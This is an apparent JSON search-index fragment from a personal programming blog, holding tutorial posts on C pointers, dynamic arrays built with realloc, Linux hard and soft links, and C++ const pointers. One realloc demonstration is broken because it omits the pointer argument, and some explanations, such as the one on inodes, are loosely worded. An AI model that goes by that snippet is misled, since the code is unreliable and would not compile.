dereference a pointer, this will return the value that the address of pointer is pointing at holds.\nint x = 7; int* p = \u0026amp;x; int y = *p + 5; // 7 + 5 = 12 Updating the Address of Pointer Assign the pointer to different address to make it points to different address.\nint x = 5; int y = 7; int* p = \u0026amp;x; printf(\u0026#34;%d\\n\u0026#34;, *p); // 5 p = \u0026amp;y; printf(\u0026#34;%d\\n\u0026#34;, *p); // 7 Updating the Value of the Address the Pointer Pointed at Use the dereference operator to update the value of address that pointer is pointing at.\nint x = 5; int* p = \u0026amp;x; printf(\u0026#34;%d\\n\u0026#34;, *p); // 5 printf(\u0026#34;%d\\n\u0026#34;, x); // 5 *p = 8; printf(\u0026#34;%d\\n\u0026#34;, *p); // 8 printf(\u0026#34;%d\\n\u0026#34;, x); // 8 Double Pointer Use pointer to modify the value that the pointer is pointing at, use double pointer to modify the address that the pointer is pointing at.\nDouble pointer is commonly used as function parameters and two dimensional array.\nchar** s = (char**) malloc(2 * sizeof(char*)); s[0] = \u0026#34;hello\u0026#34;; s[1] = \u0026#34;there\u0026#34;; printf(\u0026#34;%s\\n\u0026#34;, s[0]); printf(\u0026#34;%s\\n\u0026#34;, s[1]); Afterword Pointer in C programming language is one of the most feared aspect from its feature, however it is also the easiest way to learn about memory management.\nAnyway, I\u0026rsquo;ll see you on another one.\nStay safe!\n","permalink":"/posts/pointer-of-c-review/","summary":"\u003cp\u003eIn this short article we will review pointers\nin C programming language, if you are new to this\nkind of topic please read the tutorial of pointers\nfor beginners first, try \u003ca href=\"https://www.geeksforgeeks.org/c-pointers/\"\u003ethis tutorial\u003c/a\u003e for example.\u003c/p\u003e\n\u003ch3 id=\"defining-pointer\"\u003eDefining Pointer\u003c/h3\u003e\n\u003cp\u003eThere are several ways to define a pointer in C.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e\u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ep\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e5\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e06c75\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e; \u003cspan style=\"color:#7f848e\"\u003e// p pointer to address x\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ewe can assign the address right away like so\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e5\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e\u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"dereferencing-pointer\"\u003eDereferencing Pointer\u003c/h3\u003e\n\u003cp\u003eUse \u003ccode\u003e*\u003c/code\u003e to dereference a pointer, this will\nreturn the value that the address of pointer is\npointing at holds.\u003c/p\u003e","title":"Review of Pointer in C"},{"content":"Array data structure is really useful, it can used to to store value with same data types, we can access it really easy, updating the value of array is also a trivial thing to do. One of the most important use of array is that is it used to implement other more complex data structures such as linked list, binary tree and hash tables.\nBut what is greater than array? Yup, dynamic array.\nWe will create an echo program to see how we can implement dynamic array in C programming language.\nNow, C doesn\u0026rsquo;t support dynamic array natively, however we can implement it easily, this article will show you how.\nReallocate Memory Before implementing dynamic array in C, let\u0026rsquo;s take a look on how to realloc memory in C using realloc.\nrealloc has the following syntax:\nvoid *realloc(void *_Nullable ptr, size_t size); pretty easy to use.\nHere is a code to demonstrate the use of realloc.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int* ptr = (int*) malloc(2 * sizeof(int)); *(ptr + 0) = 7; *(ptr + 1) = 5; // *(ptr + 2) = 3; // uncommenting this will result in undefined behavior ptr = (int*) realloc(3 * sizeof(int)); *(ptr + 2) = 3; // valid free(ptr); return 0; } Using realloc is pretty straight forward, you only need to provide the pointer you wanted to resize and the new size.\nEcho Program Let\u0026rsquo;s say we have a program that capture user input and then store it in a pointer, after the user input new line, the program will print it to the standard output.\nHere is one way to implement it.\n#include \u0026lt;stdio.h\u0026gt; int main() { char s[10]; int c, i; i = 0; while (i \u0026lt; 9 \u0026amp;\u0026amp; (c = getchar()) != \u0026#39;\\n\u0026#39;) { s[i++] = c; } s[i] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, s); return 0; } The code above will work just fine however, it will only able to print up to 9 characters long (10 characters with the \\0 delimiter).\nWhat if user input more than 9 characters? Well, we can just allocate big enough memory to store the user\u0026rsquo;s input. However, this might not be the best choice for our problem because allocating such big memory with no use is just impractical. User can input only 5 characters but if we already allocated, say 1000 characters, the rest of the memory will be unused.\nSince we never know the exact length of the user\u0026rsquo;s input, how about we start with small array and then increase the size of the array accordingly. This is where we use dynamic memory allocation.\nRewriting the above code will give us the following.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { char* s = (char*) malloc(10 * sizeof(char)); int c, i; i = 0; while (i \u0026lt; 9 \u0026amp;\u0026amp; (c = getchar()) != \u0026#39;\\n\u0026#39;) { *(s+i) = c; ++i; } *(s+i) = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, s); free(s); return 0; } Yes, it is still static.\nWe need to use realloc to resize the pointer s.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define BUFSIZE 8 int main() { char* s = (char*) malloc(BUFSIZE * sizeof(char)); int c, i, j; i = 0; j = 1; while ((c = getchar()) != \u0026#39;\\n\u0026#39;) { *(s+i) = c; ++i; if (i % BUFSIZE == 0) { ++j; s = (char*) realloc(s, BUFSIZE * j * sizeof(char)); } } *(s+i) = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, s); free(s); return 0; } Now the program will work as expected. Compile using -Wall -Werror -fsanitize=address using gcc to check if the program compiles correctly.\nAfterword We have seen how we can implement a dynamic array in C programming language, there are a lot of things we can improve in our echo program like error handling and non-ascii characters. I\u0026rsquo;ll leave it to you to do that.\nThat\u0026rsquo;s it for now, I\u0026rsquo;ll see you on another one.\nStay safe!\n","permalink":"/posts/dynamic-array-in-c-simplified/","summary":"\u003cp\u003eArray data structure is really useful, it can used to to store value\nwith same data types, we can access it really easy, updating the value\nof array is also a trivial thing to do. One of the most important use\nof array is that is it used to implement other more complex data structures\nsuch as linked list, binary tree and hash tables.\u003c/p\u003e\n\u003cp\u003eBut what is greater than array? Yup, dynamic array.\u003c/p\u003e","title":"Dynamic Array in C Simplified"},{"content":"Definition Before we talk about hardlink and softlink in linux, we must first know what is inode and filename, and what\u0026rsquo;s the difference between the two.\nWhat is inode? Your computer needs a way to \u0026rsquo;labelize\u0026rsquo; files in its filesystem. Remember, everything is a file in linux. One way to do this is to put a unique integer value to the file. This unique integer value is what we called the inode number, which is a number that\u0026rsquo;s used to identify an inode. The inode is a data structure that describe a file-system object.\nEach file associated with inode, which is identified by an inode number. The inode contains metadata about a file, that is it has data that describe the data inside a file. A directory is just a file containing a list of inodes.\nAn inode can only associated with one file. When you move a file, you actually just putting a different path to the inode. Changing inode means changing the identity of a file at hardware level, so it is not a trivial thing to do and we rarely need to do that.\nWhat is filename? A filename or file name is a name used to uniquely identify a computer file in a file system.\n~ Wikipedia\nFilename is pretty obvious, filename to a file is like a title to a book. The definition from wikipedia said that is a unique identifier but actually it must be unique only for current directory. You can, for example, have a file named fin.txt in ~/.config and ~/Downloads.\nIt is what\u0026rsquo;s searched by software like find. File manager software also list filename when displaying files instead of inode.\nChanging a filename is easy compared to changing an inode. When you change a filename, you just changing an attribute of a file and not its identity.\nHard link Every file in Linux Filesystem starts with a single hard link. It maps the filename into the file. Let\u0026rsquo;s say I have a file and its filename, I will call the file as FILE (pretty obvious) and the filename as HARD_LINK_1, the simple way to visual the relation between the two is as the following:\nHARD_LINK_1 -\u0026gt; FILE It implies that if I refer the HARD_LINK_1 I actually referring FILE, any action I do to HARD_LINK_1 is done to FILE.\nIf I create another hard link that links to FILE, let\u0026rsquo;s say HARD_LINK_2, now FILE has two hard links. Here is how it looks like:\nHARD_LINK_1 -\u0026gt; FILE HARD_LINK_2 -\u0026gt; FILE Both HARD_LINK_1 and HARD_LINK_2 has the same inode since both are referring to the same file FILE. If I change the content via HARD_LINK_1, the content will also changed when I access it from HARD_LINK_2. When I delete HARD_LINK_1, the FILE will not gone since it has one remaining link HARD_LINK_2, it will be removed from the filesystem when all links to the data has been removed.\nHard link only work for regular files and if the new hard links exist on the same filesystem.\nSoft link Unlike hard link that links the filename to the actual data, or inode if you prefer, the soft link (also known as symbolic link) links to the filename. Say that I have a file, a filename, and a soft link, the file is called FILE, the filename is called FNAME and the soft link is called SOFT_LINK. Here is how it looks like:\nFNAME -\u0026gt; FILE SOFT_LINK -\u0026gt; FNAME When I access SOFT_LINK I\u0026rsquo;m actually accessing the FNAME that access the FILE, in other words, when I use SOFT_LINK I don\u0026rsquo;t know about the FILE, all I know is that I\u0026rsquo;m accessing a file that has a filename named FNAME.\nThis raises a problem when FNAME is deleted, since there is no link left that links to FILE, it will be removed from the filesystem, however since SOFT_LINK only knows about FNAME it will still points to FNAME even though it is now didn\u0026rsquo;t exists in the filesystem. This situation is referred to as a dangling soft link.\nUsing ln Command We have talked about hard link and soft link. How do we create one? We can use the linux command ln to create hard links and soft links. The syntax is pretty simple.\nTo create a hard link, the syntax is as the following:\nln \u0026lt;source_file\u0026gt; \u0026lt;output_file\u0026gt; To create a soft link, just add the -s flag:\nln -s \u0026lt;source_file\u0026gt; \u0026lt;output_file\u0026gt; For example, if I have a file named hello.txt, to create the hard link in the same directory with the name hardlink_hello.txt I can type:\nln hello.txt hardlink_hello.txt if I want to create a soft link named softlink_hello.txt, I just need to add the -s flag, so:\nln -s hello.txt softlink_hello.txt Afterword There you have it, a short and simplified explanation about hard link and soft link in Linux. Using hard link and soft link are useful when you want to create a shortcut to a certain program or to give it to give it another name that suits you. You can create, for example, a soft link to cp program named copy, so whenever you want to copy something just type copy instead of cp, I don\u0026rsquo;t know why you want to do that but you can.\nAnyway, that\u0026rsquo;s it for now. I\u0026rsquo;ll see you on another post.\nStay safe.\nFurther Reading Hard links and soft links in Linux explained - RedHat ","permalink":"/posts/hard-link-soft-link-in-a-nutshell-linux/","summary":"\u003ch2 id=\"definition\"\u003eDefinition\u003c/h2\u003e\n\u003cp\u003eBefore we talk about hardlink and softlink in linux, we must\nfirst know what is inode and filename, and what\u0026rsquo;s the difference\nbetween the two.\u003c/p\u003e\n\u003ch3 id=\"what-is-inode\"\u003eWhat is inode?\u003c/h3\u003e\n\u003cp\u003eYour computer needs a way to \u0026rsquo;labelize\u0026rsquo; files in its filesystem.\nRemember, \u003ca href=\"https://en.wikipedia.org/wiki/Everything_is_a_file\"\u003eeverything is a file\u003c/a\u003e in linux.\nOne way to do this is to put a unique integer value to the file.\nThis unique integer value is what we called the \u003cem\u003einode number\u003c/em\u003e, which\nis a number that\u0026rsquo;s used to identify an \u003cem\u003einode\u003c/em\u003e. The \u003ca href=\"https://en.wikipedia.org/wiki/Inode\"\u003einode\u003c/a\u003e is a data structure\nthat describe a file-system object.\u003c/p\u003e","title":"Linux Hard Link and Soft Link in a Nutshell"},{"content":"The following paragraphs are the summary of pointer and const in C++, I always forget about this topic so I decided to create a post about it.\nRegular Pointers Regular pointers are pointers the we usually use when working with pointers in C++.\nint main() { int x = 5; int* ptr = \u0026amp;x; // regular pointer to x x = 6; // *ptr would be 6 // we can change the value at the address being held *ptr = 1; // x and *ptr would be 1 int y = 88; ptr = \u0026amp;y; // changing the address that ptr is pointing at return 0; } Pointer to a const value I won\u0026rsquo;t explain what is it and the rest of the it since it is easier to explain it using code rather than using words. (The definitions are still confusing to me💀)\nint main() { const int x = 5; const int* ptr = \u0026amp;x; // ptr is pointing to a \u0026#34;const int\u0026#34; int* ptr = \u0026amp;x; // this will cause compilation error *ptr = 8; // this is not allowed; changing the value of \u0026#34;const int\u0026#34; const int y = 8; ptr = \u0026amp;y; // this is allowed; the pointer is not const, only the value of // the pointer that\u0026#39;s const return 0; } Pointer to const can point to non-const variable.\nint main() { int x = 5; const int* ptr = \u0026amp;x; // allowed *ptr = 6; // not allowed; changing the value of pointer to const x = 6; // allowed; x is not const return 0; } Const pointers int main() { int x = 5; int y = 6; int* const ptr = \u0026amp;x; // this is the const pointer, we can\u0026#39;t change // the address of ptr ptr = \u0026amp;y; // this is not allowed *ptr = 8; // allowed; the value it is pointing at is not const return 0; } Const pointer to a const value int main() { int x = 5; int y = 7; const int* const ptr = \u0026amp;x; // const pointer to a const value *ptr = 7; // not allowed ptr = \u0026amp;y; // also not allowed return 0; } Afterword This is just a note I write so I can comeback to it when I forget.\nAnyway, see you on another post.\nStay safe!\n","permalink":"/posts/cpp-pointer-const/","summary":"\u003cp\u003eThe following paragraphs are the summary of pointer\nand const in C++, I always forget about this topic\nso I decided to create a post about it.\u003c/p\u003e\n\u003ch2 id=\"regular-pointers\"\u003eRegular Pointers\u003c/h2\u003e\n\u003cp\u003eRegular pointers are pointers the we usually use when\nworking with pointers in C++.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-cpp\" data-lang=\"cpp\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#61afef;font-weight:bold\"\u003emain\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e5\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e\u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003eptr\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e; \u003cspan style=\"color:#7f848e\"\u003e// regular pointer to x\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e06c75\"\u003ex\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e6\u003c/span\u003e; \u003cspan style=\"color:#7f848e\"\u003e// *ptr would be 6\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#7f848e\"\u003e// we can change the value at the address being held\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#56b6c2\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003eptr\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e1\u003c/span\u003e; \u003cspan style=\"color:#7f848e\"\u003e// x and *ptr would be 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e5c07b\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#e06c75\"\u003ey\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e88\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e06c75\"\u003eptr\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#56b6c2\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#e06c75\"\u003ey\u003c/span\u003e; \u003cspan style=\"color:#7f848e\"\u003e// changing the address that ptr is pointing at\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#7f848e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#c678dd\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#d19a66\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"pointer-to-a-const-value\"\u003ePointer to a const value\u003c/h2\u003e\n\u003cp\u003eI won\u0026rsquo;t explain what is it and the rest of the it since it\nis easier to explain it using code rather than using words.\n(The definitions are still confusing to me💀)\u003c/p\u003e","title":"Pointer and Const in C++"}]